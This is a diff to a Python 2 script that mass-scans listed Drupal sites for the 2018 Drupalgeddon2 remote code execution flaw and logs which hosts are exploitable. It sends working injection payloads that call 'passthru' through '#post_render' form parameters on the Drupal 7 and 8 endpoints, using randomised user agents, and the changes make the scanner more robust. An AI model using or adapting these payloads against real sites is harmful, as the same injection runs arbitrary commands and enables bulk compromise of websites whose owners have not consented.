@@ -11,8 +11,8 @@ from multiprocessing import Pool
 
 start = time.time()
 urllib3.disable_warnings()
-
-file = open(sys.argv[1], 'r', encoding="utf-8")
+print sys.argv[1]
+file = open(sys.argv[1], 'r')
 outputfile = sys.argv[2]
 lines = file.readlines()
 # outputfile = "output.txt"
@@ -41,20 +41,27 @@ def genSignature(size=6, chars=string.ascii_uppercase + string.digits):
 
 
 def isFormValid(host, version, headers):
-
     form_id = 'user/password' if version[:1] == '7' else 'user/register'
     # check form with ?q
     url = host + '?q=' + form_id
     # print url
-    r = requests.get(url, headers=headers, timeout=1)
+    try:
+        r = requests.get(url, headers=headers, timeout=5)
+    except :
+        print url + ' : Fail request'
+        # with open(outputfile, 'a') as f:
+        #     f.write("%s === Request Fail ===\n" % host.encode("utf-8"))
+        return False
+    
     if (r.status_code == 200):
         return True
     # check form without ?q
     url = host + form_id
     # print url
-    r = requests.get(url, headers=headers, timeout=1)
+    r = requests.get(url, headers=headers, timeout=5)
     if (r.status_code == 200):
         return True
+    print "Form not valid"
     return False
 
 
@@ -66,8 +73,11 @@ def isPwnAble_2018(host, version, headers):
                       'name[#type]': 'markup', 'name[#markup]': ' echo ' + signature}
         post_params = {'form_id': 'user_pass',
                        '_triggering_element_name': 'name'}
-        r = requests.post(host, data=post_params,
-                          params=get_params, verify=False, headers=headers, timeout=1)
+        try:
+            r = requests.post(host, data=post_params,
+                    params=get_params, verify=False, headers=headers, timeout=5)
+        except :
+            return False
         m = re.search(
             r'<input type="hidden" name="form_build_id" value="([^"]+)"', r.text)
         if m:
@@ -75,7 +85,7 @@ def isPwnAble_2018(host, version, headers):
             get_params = {'q': 'file/ajax/name/#value/' + found}
             post_params = {'form_build_id': found}
             res = requests.post(host, data=post_params,
-                                params=get_params, headers=headers, timeout=1)
+                                params=get_params, headers=headers, timeout=5)
             detect = re.search(signature, res.text)
             if detect:
                 return True
@@ -85,8 +95,12 @@ def isPwnAble_2018(host, version, headers):
         host = host + 'user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax'
         post_params = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[a][#post_render][]': 'passthru',
                        'mail[a][#type]': 'markup', 'mail[a][#markup]': ' echo ' + signature}
-        r = requests.post(host, data=post_params,
-                          verify=False, headers=headers, timeout=1)
+        try:
+            r = requests.post(host, data=post_params,
+                    verify=False, headers=headers, timeout=5)
+        except:
+            return False
+
         m = re.search(signature, r.text)
         if m:
             return True
@@ -99,14 +113,21 @@ def isVulnerable(lines):
         'User-Agent': getRandomUserAgent()
     }
     host = "http://"+lines.strip().split("|")[0]+"/"
+    # print host
     version = lines.strip().split("|")[1]
     # print('Form Valid: ', isFormValid(host, version, headers))
-    if isFormValid(host, version, headers):
-        print(host)
-        if isPwnAble_2018(host, version, headers) == False:
+    formValid = isFormValid(host, version, headers)
+    if (formValid == True):
+        isPwned = isPwnAble_2018(host, version, headers) 
+        if isPwned == True:
             with open(outputfile, 'a') as f:
-                f.write("%s\n" % host.encode("utf-8"))
-
+                f.write("%s === Vuln OK ===\n" % host.encode("utf-8"))
+        else:
+            with open(outputfile, 'a') as f:
+                f.write("%s === Vuln Fail ===\n" % host.encode("utf-8"))
+    else:
+        with open(outputfile, 'a') as f:
+            f.write("%s === Form Fail ===\n" % host.encode("utf-8"))
 
 if __name__ == "__main__":
     # lines = 'argusme.com|7.44'
